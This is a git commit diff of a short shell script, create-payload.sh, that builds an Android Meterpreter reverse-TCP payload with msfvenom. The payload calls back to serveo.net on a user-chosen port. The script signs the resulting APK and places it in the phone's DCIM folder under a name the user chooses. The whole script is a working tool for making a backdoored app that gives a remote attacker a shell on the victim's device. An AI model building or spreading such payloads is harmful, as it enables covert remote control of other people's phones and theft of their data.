f5449fb0d4eb84e5c1b8576083719bcd6658f95c
Bishal Shaw <32494350+Bishalshaw@users.noreply.github.com>
2019-03-30 16:12:26 +0530

    Add files via upload

--- create-payload.sh
+++ create-payload.sh
@@ -3,6 +3,6 @@
 
 read -p 'Enter port for serveo: ' port
 read -p 'Enter output filename: ' output
-msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port R Test.apk
-apksigner autokey Test.apk Testing.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port R > Newtest.apk
+apksigner autokey Newtest.apk Testing.apk
 mv Testing.apk storage/dcim/$output.apk
